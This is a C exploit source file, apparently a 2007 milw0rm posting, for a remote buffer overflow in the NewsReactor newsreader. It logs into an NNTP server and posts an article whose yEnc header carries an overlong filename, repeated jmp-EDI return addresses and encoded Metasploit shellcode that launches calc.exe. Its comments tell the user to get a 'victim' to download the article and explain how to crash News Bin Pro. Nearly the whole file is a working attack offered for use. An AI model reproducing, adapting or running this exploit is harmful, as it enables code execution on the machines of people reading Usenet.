/*********************************************************************************
*         NewsReactor 20070220 Article Grabbing Remote Buffer Overflow           *
*                                Exploit 2                                       *
*                                                                                *
*                                                                                *
* Check the other advisory for technical details.                                *
*                                                                                *
* This exploit connects to your newsgroups provider and posts a crafted article. *
*                                                                                *
* Ask your victim to grab it to trigger the bug and execute calc.exe.            *
* Return address should work on XP SP2 FR.                                       *
* Should fail on english systems cause I took the first return address I got =D. *
* Have Fun!                                                                      *
*                                                                                *
* Tested against WIN XP SP2 FR                                                   *
* Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>                     *
*                                                                                *
* Note: change evilbuff to crash News Bin Pro 4.32. 800 'A' should be enough.    *
*********************************************************************************/


#include "winsock2.h"
#include "stdio.h"
#include "stdlib.h"
#pragma comment(lib, "ws2_32.lib")


/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com */
/* 0x00 0x0b 0x0c 0x0a 0x0d 0x0e 0x0f 0x09 0x20 0x22 0x7C */
char calcshellcode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48"
"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x58"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x58"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x44"
"\x4b\x48\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x48"
"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x43"
"\x42\x4c\x46\x56\x4b\x48\x42\x34\x42\x53\x45\x48\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x37\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x53\x4f\x35\x41\x53"
"\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x56\x50\x47\x4a\x4d\x44\x4e\x43\x57\x4a\x56\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x56\x43\x36\x50\x42\x45\x56\x4a\x47\x45\x36\x42\x30\x5a";

int main(int argc, char* argv[])
{
	struct hostent *he;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	int nntpsock;
	char recvbuff[500];
	char buffer[100];
	char authuser[]="AUTHINFO USER %s\r\n";
	char authpass[]="AUTHINFO PASS %s\r\n";
	char evilbuff[10000];
	char *user=0,*pass=0,*subject,*group,*author;
	int i=2;

	WSACleanup();
	WSAStartup(MAKEWORD(2,0),&wsa);

	if (argc<5) {
		printf("[+] NewsReactor Article Grabbing Remote Buffer Overflow\n");
		printf("[+] Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
		printf("[+] Usage: %s Newsserver [-u User] [-p Pass] Group Subject Author\n",argv[0]);
		printf("[+] example:\n    %s news.giganews.com -i user -p pass alt.binaries.dvdr boomboom superman\n",argv[0]);
		return 0;
	}
	
	if (strstr(argv[i],"-u")) {
		i++;
		user=argv[i];
		i++;
	}
	if (strstr(argv[i],"-p")) {
		i++;
		pass=argv[i];
		i++;
	}
	group=argv[i++];
	subject=argv[i++];
	author=argv[i];
	
	printf("%s \n%s \n%s \n",group,subject,author);
	if ((he=gethostbyname(argv[1])) == NULL) { 
		printf("Failed\n[-] Could not init gethostbyname\n");
		return 1;
	}
	if ((nntpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Failed\n[-] Socket error\n");
		return 1;
	}

	sock_addr.sin_family = PF_INET;
	sock_addr.sin_port = htons(119);
	sock_addr.sin_addr = *((struct in_addr *)he->h_addr);
	memset(&(sock_addr.sin_zero), '\0', 8);
	if (connect(nntpsock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
		printf("[-] Unable to connect\n");
		return 1;
	}
	printf("[+] Connected to %s\n",argv[1]);
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf("-> %s",recvbuff);
	
	if (user!=0) {
		memset(buffer,0,100);
		sprintf(buffer,authuser,user);
		send(nntpsock,buffer,strlen(buffer),0);
		printf("[+] USER %s\n",user);
		memset(recvbuff,'\0',500);
		recv(nntpsock, recvbuff, 500, 0);
		printf("-> %s",recvbuff);
	}
	
	if (pass!=0) {
		memset(buffer,0,100);
		sprintf(buffer,authpass,pass);
		send(nntpsock,buffer,strlen(buffer),0);
		printf("[+] PASS %s\n",pass);
		memset(recvbuff,'\0',500);
		recv(nntpsock, recvbuff, 500, 0);
		printf("-> %s",recvbuff);
	}
	
	send(nntpsock,"MODE READER\r\n",strlen("MODE READER\r\n"),0);
	printf("[+] MODE READER\n");
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf("-> %s",recvbuff);
	
	send(nntpsock,"POST\r\n",strlen("POST\r\n"),0);
	printf("[+] POST\n");
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf("-> %s",recvbuff);
	
char header[]=
"From: %s <%s@blabla.com>\r\n"
"Newsgroups: %s\r\n"
"Subject: %s (1/1) \r\n"
"X-Newsreader: blabla\r\n\r\n";

char fileheader[]="=ybegin part=1 line=128 size=127 name="
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAA"
"\xD6\xE6\xE3\x77" //jmp EDI in advapi32.dll XP SP2 FR.
"\xD6\xE6\xE3\x77" //ugly but we don't know where we land...
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"AAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAA";

char file[]="=ypart begin=1 end=127\r\n"  //encoded file. Doesnt matter but works!
"vkJmyvvsxoJkJno}J..J\\74n.ncJ.Q......7474....JWJ[X]]J........J^Y]74..JWJk.....J\\XZVJ.....J\\XZ74}..J....JdJp.....\r\n";
char fileend[]="=yend size=127 part=1 pcrc32=d4f19f0f\r\n";
char postend[]="\r\n.\r\n";


	memset(evilbuff,0,10000);
	sprintf(evilbuff,header,author,author,group,subject);
	printf("[+] Message header:\n%s",evilbuff);
	send(nntpsock,evilbuff,strlen(evilbuff),0);
	Sleep(100);

	memset(evilbuff,0,10000);
	memcpy(evilbuff,fileheader,strlen(fileheader));
	memcpy(evilbuff+strlen(fileheader),calcshellcode,strlen(calcshellcode));
	memcpy(evilbuff+strlen(fileheader)+strlen(calcshellcode),"\r\n\0",3);
	send(nntpsock,evilbuff,strlen(evilbuff),0);
	Sleep(100);

	send(nntpsock,file,strlen(file),0);
	Sleep(100);
	send(nntpsock,fileend,strlen(fileend),0);
	Sleep(100);
	send(nntpsock,postend,strlen(postend),0);
	Sleep(100);
	
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf("-> %s",recvbuff);

	printf("[+] Article posted. Have fun\n");
	Sleep(1000);
	return 0;
}

// milw0rm.com [2007-03-12]
